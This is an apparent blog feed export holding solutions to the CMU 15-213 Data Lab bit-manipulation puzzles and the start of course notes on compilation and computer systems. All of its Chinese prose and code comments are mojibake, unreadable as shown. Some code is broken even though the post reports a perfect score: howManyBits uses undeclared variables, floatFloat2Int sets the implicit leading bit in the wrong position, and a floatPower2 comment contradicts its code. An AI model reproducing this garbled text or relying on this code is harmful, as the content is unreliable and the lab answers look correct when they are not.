æ€è·¯ï¼šç”±äºbanæ‰äº†ifï¼Œå¦‚æœå¯¹æ­£æ•°å’Œè´Ÿæ•°åˆ†åˆ«å¤„ç†æ¯”è¾ƒéº»çƒ¦ï¼Œæˆ‘ä»¬è€ƒè™‘å°†è´Ÿæ•°å–åå’Œæ­£æ•°ç»Ÿä¸€å¤„ç†ã€‚ä¹‹åï¼Œç†è®ºä¸Šæˆ‘ä»¬å¯ä»¥è¿›è¡Œ31æ¬¡å³ç§»æ“ä½œè¿›è¡ŒæŸ¥æ‰¾æ‰¾åˆ°æœ€é«˜æœ‰æ•ˆä½ä¸Šçš„1ï¼Œä½†ä¸ºäº†æ•ˆç‡æ›´é«˜ï¼ŒäºŒåˆ†æŸ¥æ‰¾çš„æ€æƒ³ä¼¼ä¹æ˜¯ä¸é”™çš„é€‰æ‹©ã€‚</p>   <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">howManyBits</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123;<br>    <span class="hljs-comment">// åˆ¤æ–­æ­£è´Ÿï¼Œæå–ç¬¦å·ä½,æ­£æ•°signä¸º0x00000000ï¼Œè´Ÿæ•°ä¸º0xFFFFFFFF</span><br>    <span class="hljs-type">int</span> sign = x &gt;&gt; <span class="hljs-number">31</span>;<br>    <span class="hljs-comment">// å°†è´Ÿæ•°è½¬æ¢ä¸ºæ­£æ•°-x-1(~x)</span><br>    x = (sign &amp; ~x) | (~sign &amp; x);<br>    <span class="hljs-comment">// äºŒåˆ†æ³•è¿›è¡Œå¯»æ‰¾ï¼Œé¦–å…ˆæ£€æŸ¥xçš„é«˜16ä½æ˜¯å¦æœ‰1ï¼Œè‹¥æ²¡æœ‰b16=0ï¼Œxä¸å˜ï¼Œè‹¥æœ‰b16=16ï¼Œæ­¤æ—¶è‡³å°‘éœ€è¦16ä½ï¼›xå³ç§»16ä½ï¼Œç»§ç»­æŸ¥æ‰¾å‰©ä½™16ä½ä¸Šæœ‰æ²¡æœ‰1.</span><br>    <span class="hljs-type">int</span> b16 = !!(x &gt;&gt; <span class="hljs-number">16</span>) &lt;&lt; <span class="hljs-number">4</span>;<br>    x = x &gt;&gt; b16;<br>    <span class="hljs-comment">// é‡å¤äºŒåˆ†æŸ¥æ‰¾ï¼Œç¼©å°æ­¥é•¿</span><br>    b8 = !!(x &gt;&gt; <span class="hljs-number">8</span>) &lt;&lt; <span class="hljs-number">3</span>;<br>    x = x &gt;&gt; b8;<br>    b4 = !!(x &gt;&gt; <span class="hljs-number">4</span>) &lt;&lt; <span class="hljs-number">2</span>;<br>    x = x &gt;&gt; b4;<br>    b2 = !!(x &gt;&gt; <span class="hljs-number">2</span>) &lt;&lt; <span class="hljs-number">1</span>;<br>    x = x &gt;&gt; b2;<br>    b1 = !!(x &gt;&gt; <span class="hljs-number">1</span>);<br>    x = x &gt;&gt; b1;<br>    b0 = x;<br>    <span class="hljs-keyword">return</span> b16 + b8 + b4 + b2 + b1 + b0 + <span class="hljs-number">1</span>;<br>    <br>&#125;<br></code></pre></td></tr></table></figure><ol start="11"><li><p>floatScale2ï¼šä½¿ç”¨æ‰€æœ‰æ•´å‹&#x2F;æ— ç¬¦å·æ•°çš„è¿ç®—ç¬¦ä»¥åŠ<code>if</code>å’Œ<code>while</code>è¯­å¥ï¼Œè¿”å›è¾“å…¥æµ®ç‚¹æ•°çš„ä¸¤å€ï¼Œç‰¹æ®Šæƒ…å†µå¦‚NaNåˆ™è¿”å›æœ¬èº«ã€‚</p><p>æ€è·¯ï¼šç»™å®šçš„æµ®ç‚¹æ•°çš„æ ¼å¼åŒ…æ‹¬ï¼šç¬¦å·ä½ï¼šç¬¬ 31 ä½ï¼ŒæŒ‡æ•°ä½ï¼šç¬¬ 30-23 ä½ï¼Œå°¾æ•°ä½ï¼šç¬¬ 22-0 ä½ã€‚æˆ‘ä»¬åªéœ€è¦æå–æŒ‡æ•°ä½ï¼Œé€šè¿‡åˆ¤æ–­å¯¹åº”çš„æƒ…å†µå¹¶å¤„ç†ç‰¹æ®Šæƒ…å†µï¼ˆ0ï¼Œéè§„æ ¼åŒ–ï¼Œç‰¹æ®Šå€¼ï¼‰ï¼Œä¸€èˆ¬æƒ…å†µå°†æŒ‡æ•°ä½å·¦ç§»1å³å¯ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-title function_">floatScale2</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> uf)</span> &#123;<br>  <span class="hljs-comment">// 0</span><br>  <span class="hljs-keyword">if</span>(uf == <span class="hljs-number">0</span> || uf == (<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">31</span>)) &#123;<br>    <span class="hljs-keyword">return</span> uf;<br>  &#125;<br>  <span class="hljs-comment">// NaN æˆ– infty</span><br>  <span class="hljs-keyword">if</span>(((uf &gt;&gt; <span class="hljs-number">23</span>) &amp; <span class="hljs-number">0xff</span>) == <span class="hljs-number">0xff</span>)<br>    <span class="hljs-keyword">return</span> uf;<br>  <span class="hljs-comment">// éè§„æ ¼åŒ–çš„</span><br>  <span class="hljs-keyword">if</span>(((uf &gt;&gt; <span class="hljs-number">23</span>) &amp; <span class="hljs-number">0xff</span>) == <span class="hljs-number">0x00</span>) <br>    <span class="hljs-keyword">return</span> ((uf &amp; <span class="hljs-number">0x007FFFFF</span>) &lt;&lt; <span class="hljs-number">1</span>) | ((<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">31</span>) &amp; uf);<br>  <span class="hljs-comment">// æ™®é€šæƒ…å†µ</span><br>  <span class="hljs-keyword">return</span> uf + (<span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">23</span>);<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>floatFloat2Intï¼šå®ç°å•ç²¾åº¦æµ®ç‚¹æ•°å¼ºåˆ¶è½¬æ¢ä¸ºæ•´å‹çš„æ“ä½œã€‚</p><p>æ€è·¯ï¼šè¿˜æ˜¯åˆ©ç”¨æµ®ç‚¹æ•°çš„å®šä¹‰ï¼š$(-1)^s\times M\times 2^E$ï¼Œä¹˜2çš„å¹‚å¯ä»¥è½¬æ¢ä¸ºå·¦ç§»ã€‚æœ€åèˆå¼ƒå°æ•°éƒ¨åˆ†å°±å¾—åˆ°å¯¹åº”æ•´å‹ã€‚æ•…æˆ‘ä»¬ä¸å¦¨å…ˆå°†ä¸‰éƒ¨åˆ†åˆ†åˆ«æå–å‡ºæ¥ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">floatFloat2Int</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> uf)</span> &#123;<br>  <span class="hljs-type">int</span> sign = (uf &gt;&gt; <span class="hljs-number">31</span>) &amp; <span class="hljs-number">0x1</span>;<br>  <span class="hljs-type">int</span> <span class="hljs-built_in">exp</span> = (uf &gt;&gt; <span class="hljs-number">23</span>) &amp; <span class="hljs-number">0xFF</span>;<br>  <span class="hljs-type">int</span> frac = uf &amp; <span class="hljs-number">0x7FFFFF</span>;<br>  <br>  <span class="hljs-comment">// è¿™é‡Œå‚è€ƒè¡¥ç Eå’ŒMçš„å®šä¹‰ï¼ŒBias=127</span><br>  <span class="hljs-type">int</span> E = <span class="hljs-built_in">exp</span> - <span class="hljs-number">127</span>;<br>  <span class="hljs-type">int</span> M = frac + <span class="hljs-number">0x1000000</span>;<br>  <span class="hljs-type">int</span> ans;<br><br>  <span class="hljs-keyword">if</span>(E &lt; <span class="hljs-number">0</span> || <span class="hljs-built_in">exp</span> == <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  &#125;<br><br>  <span class="hljs-keyword">if</span> ( E &gt;= <span class="hljs-number">31</span> || <span class="hljs-built_in">exp</span> == <span class="hljs-number">0xFF</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0x80000000</span>u;<br>  &#125;<br><br>  <span class="hljs-keyword">if</span> (E &gt; <span class="hljs-number">24</span>) &#123;<br>    ans = M &lt;&lt; (E - <span class="hljs-number">24</span>);<br>  &#125;<br><br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (E &lt;= <span class="hljs-number">24</span>) &#123;<br>    ans = M &gt;&gt; (<span class="hljs-number">24</span> - E);<br>  &#125;<br><br>  <span class="hljs-keyword">if</span>(sign) &#123;<br>    ans = -ans;<br>  &#125;<br>  <span class="hljs-keyword">return</span> ans;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>floatPower2ï¼šå®ç°å°†æ•´å‹$2^x$è¡¨è¾¾ä¸ºå•ç²¾åº¦æµ®ç‚¹æ•°ã€‚</p><p>æ€è·¯ï¼šä¸»è¦è¿˜æ˜¯å¯¹æŒ‡æ•°éƒ¨åˆ†çš„å¤„ç†ï¼Œxä»£è¡¨ä½ç§»é‡ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-title function_">floatPower2</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123;<br>    <span class="hljs-type">int</span> <span class="hljs-built_in">exp</span>, result;<br>    <span class="hljs-type">int</span> bias = <span class="hljs-number">127</span>; <br><br>    <span class="hljs-comment">// å¯¹æŒ‡æ•°éƒ¨åˆ†è¿›è¡Œå¤„ç†</span><br>    <span class="hljs-built_in">exp</span> = x + bias;<br><br>    <span class="hljs-comment">// å¦‚æœæŒ‡æ•°éƒ¨åˆ†è¶…å‡ºäº†è¡¨ç¤ºèŒƒå›´ï¼Œåˆ™è¿”å›+INF</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">exp</span> &lt;= <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">exp</span> &gt;= <span class="hljs-number">255</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0x7f800000</span>; <br>    &#125;<br><br>    <span class="hljs-comment">// æ„é€ å•ç²¾åº¦æµ®ç‚¹æ•°çš„ä½çº§è¡¨ç¤º</span><br>    result = <span class="hljs-built_in">exp</span> &lt;&lt; <span class="hljs-number">23</span>; <span class="hljs-comment">// å°†æŒ‡æ•°éƒ¨åˆ†ç§»åŠ¨åˆ°æ­£ç¡®çš„ä½ç½®</span><br><br>    <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><p>æœ€åè´´ä¸€å¼ æœ€ç»ˆç»“æœï¼š</p><table><thead><tr><th>Points</th><th>Rating</th><th>Errors</th><th>Points</th><th>Ops</th><th>Puzzle</th></tr></thead><tbody><tr><td>1</td><td>1</td><td>0</td><td>2</td><td>8</td><td>bitXor</td></tr><tr><td>1</td><td>1</td><td>0</td><td>2</td><td>1</td><td>tmin</td></tr><tr><td>1</td><td>1</td><td>0</td><td>2</td><td>7</td><td>isTmax</td></tr><tr><td>2</td><td>2</td><td>0</td><td>2</td><td>7</td><td>allOddBits</td></tr><tr><td>2</td><td>2</td><td>0</td><td>2</td><td>2</td><td>negate</td></tr><tr><td>3</td><td>3</td><td>0</td><td>2</td><td>13</td><td>isAsciiDigit</td></tr><tr><td>3</td><td>3</td><td>0</td><td>2</td><td>8</td><td>conditional</td></tr><tr><td>3</td><td>3</td><td>0</td><td>2</td><td>9</td><td>isLessOrEqual</td></tr><tr><td>4</td><td>4</td><td>0</td><td>2</td><td>5</td><td>logicalNeg</td></tr><tr><td>4</td><td>4</td><td>0</td><td>2</td><td>36</td><td>howManyBits</td></tr><tr><td>4</td><td>4</td><td>0</td><td>2</td><td>17</td><td>floatScale2</td></tr><tr><td>4</td><td>4</td><td>0</td><td>2</td><td>20</td><td>floatFloat2Int</td></tr><tr><td>4</td><td>4</td><td>0</td><td>2</td><td>4</td><td>floatPower2</td></tr></tbody></table><p><strong>Score &#x3D; 62&#x2F;62 [36&#x2F;36 Corr + 26&#x2F;26 Perf] (137 total operators)</strong></p>]]></content>
    
    
    <categories>
      
      <category>CMU15-213</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CMU15-213</title>
    <link href="/2024/06/25/CMU15-213/"/>
    <url>/2024/06/25/CMU15-213/</url>
    
    <content type="html"><![CDATA[<p>æœ¬ç¯‡ä¸»è¦è®°å½•åœ¨å­¦ä¹ è¯¾ç¨‹CMU15-213(version:sp23)ä»¥åŠé…å¥—æ•™æCS:APPä¸­çš„æ€»ç»“ã€æ¢³ç†ã€æ‹“å±•ä»¥åŠä¸ªäººæ„Ÿæƒ³ã€‚<br>Labéƒ¨åˆ†ä¼šè®°å½•è§£é¢˜æ€è·¯åœ¨å¦å¤–éƒ¨åˆ†ã€‚</p><h1 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h1><blockquote><p>å¯¹åº”CS:APPç¬¬ä¸€ç« </p></blockquote><p>è®©æˆ‘ä»¬ä»è¯¦ç»†ç†è§£ä¸€æ®µä»£ç çš„ç”Ÿå‘½å‘¨æœŸå¼€å§‹æ·±å…¥äº†è§£è®¡ç®—æœºåœ¨è¿™ä¸€è¿‡ç¨‹ä¸­å®Œæˆäº†å“ªäº›æ“ä½œã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> <br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hello, world\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>helloç¨‹åºçš„ç”Ÿå‘½å‘¨æœŸæ˜¯ä»ä¸€ä¸ªé«˜çº§çš„Cè¯­è¨€ç¨‹åºå¼€å§‹çš„ï¼Œä½†æ˜¯åœ¨æœºå™¨æ‰§è¡Œæ—¶éœ€è¦å°†è¿™äº›è¯­å¥è½¬åŒ–ä¸ºä¸€ç³»åˆ—çš„ä½çº§<strong>æœºå™¨è¯­è¨€</strong>æŒ‡ä»¤ã€‚ç„¶åè¿™äº›æŒ‡ä»¤æŒ‰ç…§ä¸€ç§ç§°ä¸º<strong>å¯æ‰§è¡Œç›®æ ‡ç¨‹åº</strong>çš„æ ¼å¼æ‰“åŒ…ï¼Œå¹¶ä»¥äºŒè¿›åˆ¶ç£ç›˜æ–‡ä»¶çš„å½¢å¼å­˜æ”¾èµ·æ¥ã€‚</p><p>é€šè¿‡ä¸€æ¡æŒ‡ä»¤ <em>gcc -o hello hello.c</em> ï¼Œæˆ‘ä»¬ä¾¿å¯ä»¥å°†ç¨‹åºç¼–è¯‘ä¸ºå¯æ‰§è¡Œæ–‡ä»¶ã€‚å…·ä½“è€Œè¨€ï¼Œä¸€èˆ¬éœ€è¦ç»å†ä»¥ä¸‹è¿‡ç¨‹ã€‚</p><p><img src="/Pictures/CMU15-213/%E7%BC%96%E8%AF%91%E7%B3%BB%E7%BB%9F.png" alt="ç¼–è¯‘ç³»ç»Ÿ"></p><ul><li><strong>é¢„å¤„ç†é˜¶æ®µ</strong>ã€‚é¢„å¤„ç†å™¨ï¼ˆcppï¼‰æ ¹æ® # å¼€å¤´çš„å‘½ä»¤ä¿®æ”¹åŸå§‹çš„Cç¨‹åºã€‚åœ¨è¿™é‡Œï¼Œincludeè¯­å¥å‘Šè¯‰é¢„å¤„ç†å™¨å°†stdio.hæ–‡ä»¶ä¸­ä»å†…å®¹æ’å…¥ç¨‹åºæ–‡æœ¬ä¸­ã€‚ç»è¿‡è¿™ä¸€æ­¥ï¼Œæˆ‘ä»¬å®ç°äº†ä» <em>hello.c</em>åˆ°<em>hello.i</em>çš„å˜åŒ–ã€‚</li><li><strong>ç¼–è¯‘é˜¶æ®µ</strong>ã€‚ç¼–è¯‘å™¨ï¼ˆcclï¼‰å°†æ–‡æœ¬æ–‡ä»¶ <em>hello.i</em> ç¿»è¯‘æˆ <em>hello.s</em> ï¼Œå³ç¿»è¯‘ä¸ºæ±‡ç¼–è¯­è¨€ç¨‹åºã€‚</li><li><strong>æ±‡ç¼–é˜¶æ®µ</strong>ã€‚æ±‡ç¼–å™¨ï¼ˆasï¼‰å°† <em>hello.s</em> ç¿»è¯‘ä¸ºæœºå™¨è¯­è¨€æŒ‡ä»¤å¹¶æ‰“åŒ…ä¸º<strong>å¯é‡å®šä½ç›®æ ‡ç¨‹åº</strong>çš„æ ¼å¼ï¼Œå¹¶ä¿å­˜åœ¨äºŒè¿›åˆ¶æ–‡ä»¶ <em>hello.o</em> ä¸­ã€‚</li><li><strong>é“¾æ¥é˜¶æ®µ</strong>ã€‚åœ¨helloç¨‹åºä¸­è°ƒç”¨äº†printfå‡½æ•°ï¼Œè¯¥å‡½æ•°ä¿å­˜åœ¨<em>printf.o</em>æ–‡ä»¶ä¸­ï¼Œé“¾æ¥è¿‡ç¨‹å°±æ˜¯å°†è¿™äº›æ–‡ä»¶ä»¥æŸç§æ–¹å¼è¿›è¡Œåˆå¹¶ã€‚åˆå¹¶å®Œæˆåæˆ‘ä»¬å¾—åˆ°<strong>å¯æ‰§è¡Œç›®æ ‡æ–‡ä»¶</strong> <em>hello</em>ã€‚</li></ul><p>åœ¨å¾—åˆ°å¯æ‰§è¡Œç›®æ ‡æ–‡ä»¶åï¼Œæˆ‘ä»¬å¯ä»¥å°†å…¶è¾“å…¥åˆ°shellï¼ˆå‘½ä»¤è¡Œè§£é‡Šå™¨ï¼‰ä¸­ã€‚</p><p>ä¸ºäº†æ›´æ·±å…¥çš„ç†è§£è¿è¡Œç¨‹åºæ—¶è®¡ç®—æœºå†…éƒ¨å‘ç”Ÿäº†ä»€ä¹ˆï¼Œæˆ‘ä»¬éœ€è¦äº†è§£ä¸€ä¸ªå…¸å‹ç³»ç»Ÿçš„ç¡¬ä»¶çŸ¥è¯†ã€‚</p><img src="/Pictures/CMU15-213/System model.png"><ol><li><p>æ€»çº¿</p><p>æ€»çº¿æºå¸¦ä¿¡æ¯å­—èŠ‚å¹¶è´Ÿè´£åœ¨å„ä¸ªéƒ¨ä»¶ä¹‹é—´è¿›è¡Œä¼ é€’ã€‚é€šå¸¸æ€»çº¿è¢«è®¾è®¡ä¸ºå®šé•¿çš„å­—èŠ‚å—ï¼Œä¹Ÿå°±æ˜¯å­—ï¼ˆwordï¼‰ã€‚32ä½æŒ‡ä»£4å­—èŠ‚ï¼Œè€Œ64ä½æŒ‡ä»£8å­—èŠ‚ã€‚</p></li><li><p>I&#x2F;Oè®¾å¤‡</p><p>è¾“å…¥è¾“å‡ºè®¾å¤‡æ—¶ç³»ç»Ÿä¸å¤–éƒ¨ä¸–ç•Œè¿›è¡Œè”ç³»çš„é€šé“ã€‚å¸¸è§çš„I&#x2F;Oè®¾å¤‡åŒ…æ‹¬é”®é¼ ã€æ˜¾ç¤ºå™¨ã€ç£ç›˜ç­‰ã€‚æ¯ä¸ªè®¾å¤‡éƒ½é€šè¿‡ä¸€ä¸ª<strong>æ§åˆ¶å™¨</strong>æˆ–<strong>é€‚é…å™¨</strong>ä¸I&#x2F;Oæ€»çº¿ç›¸è¿ã€‚</p><p>æ§åˆ¶å™¨ä¸é€‚é…å™¨ä¹‹é—´çš„åŒºåˆ«åœ¨äºå°è£…æ–¹å¼ã€‚æ§åˆ¶å™¨é€šå¸¸æ˜¯I&#x2F;Oè®¾å¤‡æœ¬èº«æˆ–è€…ç³»ç»Ÿçš„ä¸»æ¿ä¸Šçš„èŠ¯ç‰‡ç»„ï¼Œè€Œé€‚é…å™¨æ—¶æ’åœ¨ä¸»æ¿ä¸Šçš„å¡ã€‚</p></li><li><p>ä¸»å­˜</p><p>ä¸»å­˜æ˜¯ä¸€ä¸ªä¸´æ—¶å­˜å‚¨è®¾å¤‡ï¼Œç”¨äºå­˜æ”¾ç¨‹åºå’Œç¨‹åºå¤„ç†çš„æ•°æ®ã€‚ä¸»å­˜ç”±ä¸€ç»„<strong>åŠ¨æ€éšæœºå­˜å–å­˜å‚¨å™¨ï¼ˆDRAMï¼‰</strong>èŠ¯ç‰‡ç»„æˆã€‚ä»é€»è¾‘ä¸Šæ¥è¯´ï¼Œå­˜å‚¨å™¨æ˜¯ä¸€ä¸ªçº¿æ€§çš„å­—èŠ‚æ•°ç»„ï¼Œæ¯ä¸€ä¸ªå­—èŠ‚éƒ½æœ‰å…¶å”¯ä¸€çš„åœ°å€ï¼ˆæ•°ç»„ç´¢å¼•ï¼‰ã€‚</p></li><li><p>å¤„ç†å™¨</p><p>å¤„ç†å™¨ï¼ˆCPUï¼‰æ˜¯è§£é‡Šï¼ˆæˆ–æ‰§è¡Œï¼‰å­˜å‚¨åœ¨ä¸»å­˜ä¸­æŒ‡ä»¤çš„å¼•æ“ã€‚å¤„ç†å™¨çš„æ ¸å¿ƒæ˜¯ä¸€ä¸ªå¤§å°ä¸ºä¸€ä¸ªå­—çš„å­˜å‚¨è®¾å¤‡ï¼ˆæˆ–å¯„å­˜å™¨ï¼‰ï¼Œç§°ä¸ºç¨‹åºè®¡æ•°å™¨ï¼ˆPCï¼‰ï¼Œåœ¨ä»»ä½•æ—¶åˆ»ï¼ŒPCéƒ½æŒ‡å‘ä¸»å­˜ä¸­æŸæ¡æœºå™¨æŒ‡ä»¤ã€‚</p><p>æŒ‡ä»¤é›†æ¶æ„å†³å®šæŒ‡ä»¤æ‰§è¡Œæ¨¡å‹ã€‚</p></li></ol><p>åœ¨è¿è¡Œä»£ç çš„è¿‡ç¨‹ä¸­ï¼Œæ•°æ®éœ€è¦åœ¨å†…å­˜ã€å¤„ç†å™¨ã€æ€»çº¿ä¸Šæ¥å›æ¬è¿ã€‚å› æ­¤è¦æé«˜è¿è¡Œé€Ÿåº¦ï¼Œå°±éœ€è¦æ˜¯è¿™äº›å¤åˆ¶æ¬è¿æ“ä½œåŠ å¿«ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡åœ¨å¤„ç†å™¨å’Œè¾ƒå¤§è¾ƒæ…¢çš„è®¾å¤‡ï¼ˆä¾‹å¦‚ä¸»å­˜ï¼‰ä¹‹é—´æ’å…¥ä¸€ä¸ªæ›´å°æ›´å¿«çš„å­˜å‚¨è®¾å¤‡ï¼ˆä¾‹å¦‚cacheï¼‰æ¥åŠ é€Ÿè¿™ä¸ªè¿‡ç¨‹ï¼Œäºæ˜¯ä¾¿äº§ç”Ÿäº†ä¸€ä¸ª<strong>å­˜å‚¨å™¨å±‚æ¬¡ç»“æ„</strong>ã€‚</p><p><img src="/Pictures/CMU15-213/%E5%AD%98%E5%82%A8%E5%99%A8%E5%B1%82%E6%AC%A1%E7%BB%93%E6%9E%84.png" alt="å­˜å‚¨å™¨å±‚æ¬¡ç»“æ„"></p><p>ä¸ºäº†é˜²æ­¢ç¡¬ä»¶è¢«å¤±æ§çš„åº”ç”¨ç¨‹åºæ»¥ç”¨ä»¥åŠæä¾›ä¸€ä¸ªç®€å•ä¸€è‡´çš„æœºåˆ¶æ¥æ§åˆ¶å¤æ‚ä½çº§çš„ç¡¬ä»¶ï¼Œæˆ‘ä»¬ä½¿ç”¨æ“ä½œç³»ç»Ÿæ¥æä¾›è¿™äº›æœåŠ¡ã€‚æ“ä½œç³»ç»Ÿæä¾›äº†å‡ ä¸ªåŸºæœ¬çš„æŠ½è±¡æ¦‚å¿µæ¥å®ç°åŸºæœ¬åŠŸèƒ½ã€‚</p><p><img src="/Pictures/CMU15-213/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F.png" alt="æ“ä½œç³»ç»Ÿ"></p><ul><li><p>è¿›ç¨‹</p><p>è¿›ç¨‹æ˜¯æ“ä½œç³»ç»Ÿå¯¹æ­£åœ¨è¿è¡Œçš„ç¨‹åºçš„ä¸€ç§æŠ½è±¡ã€‚ä¸€ä¸ªç³»ç»Ÿå¯ä»¥åŒæ—¶è¿è¡Œå¤šä¸ªè¿›ç¨‹ã€‚åœ¨ç³»ç»Ÿä¸­ï¼Œä¸€ä¸ªCPUé€šè¿‡åœ¨è¿›ç¨‹ä¹‹é—´åˆ‡æ¢æ¥å®ç°äº¤é”™æ‰§è¡Œçš„æœºåˆ¶ï¼Œç§°ä¸º<em>ä¸Šä¸‹æ–‡åˆ‡æ¢</em>ï¼Œä¹Ÿæ˜¯CPUèƒ½è¿›è¡Œå¹¶å‘æ‰§è¡Œçš„åŸå› ã€‚åœ¨è¿™é‡Œï¼Œä¸Šä¸‹æ–‡æ˜¯ä¸€ä¸ªæŠ½è±¡çš„æ¦‚å¿µï¼ŒæŒ‡æ“ä½œç³»ç»Ÿä¿æŒè·Ÿè¸ªè¿›ç¨‹è¿è¡Œæ‰€éœ€çš„æ‰€æœ‰çŠ¶æ€ä¿¡æ¯ã€‚ä¸Šä¸‹æ–‡åˆ‡æ¢æ—¶ï¼Œæ“ä½œç³»ç»Ÿä¼šä¿å­˜å½“å‰çŠ¶æ€çš„ä¸Šä¸‹æ–‡ï¼Œæ¢å¤æ–°è¿›ç¨‹çš„ä¸Šä¸‹æ–‡ã€‚æ–°è¿›ç¨‹ä¼šä»ä¸Šæ¬¡ä¸­æ–­çš„åœ°æ–¹å¼€å§‹ã€‚</p></li><li><p>çº¿ç¨‹</p><p>ä¸€ä¸ªè¿›ç¨‹å¯ä»¥ç”±å¤šä¸ªç§°ä¸ºçº¿ç¨‹çš„æ‰§è¡Œå•å…ƒç»„æˆã€‚</p></li><li><p>è™šæ‹Ÿå†…å­˜</p><p>è™šæ‹Ÿå†…å­˜ä¸ºæ¯ä¸€ä¸ªè¿›ç¨‹æä¾›äº†ä¸€ä¸ªå‡è±¡ï¼Œå³æ¯ä¸ªè¿›ç¨‹éƒ½åœ¨ç‹¬å åœ°ä½¿ç”¨ä¸»å­˜ã€‚æ¯ä¸ªè¿›ç¨‹çœ‹åˆ°çš„å†…å­˜æ˜¯ä¸€è‡´çš„ï¼Œç§°ä¸ºè™šæ‹Ÿåœ°å€ç©ºé—´ã€‚</p><p>å¯¹äºæ‰€æœ‰è¿›ç¨‹è€Œè¨€ï¼Œä»£ç æ˜¯ä»ç»Ÿä¸€å›ºå®šä½ç½®å¼€å§‹ï¼Œç´§æ¥ç€çš„æ˜¯å’ŒCå…¨å±€å˜é‡ç›¸å¯¹åº”çš„æ•°æ®ä½ç½®ã€‚</p><p>æ¶‰åŠçš„ä¸€äº›åè¯å’Œæ¦‚å¿µï¼š</p><ul><li><strong>è¿è¡Œæ—¶å †</strong>ï¼šä»£ç å’Œæ•°æ®åœ¨è¿›ç¨‹ä¸€å¼€å§‹æ—¶ç¡®å®šå¤§å°ï¼Œè°ƒç”¨å‡½æ•°æ—¶å †å¯ä»¥åœ¨è¿è¡Œæ—¶åŠ¨æ€çš„æ‰©å±•å’Œæ”¶ç¼©ã€‚</li><li><strong>å…±äº«åº“</strong>ï¼šç”¨äºå­˜æ”¾Cæ ‡å‡†åº“å’Œæ•°å­¦åº“è¿™æ ·çš„å…±äº«çš„ä»£ç å’Œæ•°æ®ã€‚</li><li><strong>ç”¨æˆ·æ ˆ</strong>ï¼šç”¨äºå®ç°å‡½æ•°çš„è°ƒç”¨ã€‚è°ƒç”¨å‡½æ•°æ—¶ä¼šå¯¼è‡´æ 